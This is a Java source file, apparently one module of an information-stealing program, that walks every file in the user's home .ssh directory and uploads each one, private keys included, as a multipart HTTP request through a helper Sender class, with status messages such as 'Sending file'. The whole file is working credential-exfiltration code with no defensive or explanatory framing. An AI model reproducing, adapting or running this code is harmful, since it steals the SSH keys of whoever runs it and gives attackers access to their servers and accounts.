package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import okhttp3.*;

import java.io.File;
import java.io.IOException;

public class Ssh {
    public static void main(String[] args) throws IOException {
        OkHttpClient client = new OkHttpClient();

        File folder = new File((System.getProperty("user.home") + "\\.ssh"));

        // Iterate through all files in the folder and add them to the request body
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                Sender.sendMessage("Found " + file.getName() + "file.");
                Sender.sendMessage("Sending file: " + file.getName());
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                        .build();

                Sender.Sender(client, file, requestBody);
            }else {
                Sender.sendMessage("No ssh files found.");
            }
        }
    }
}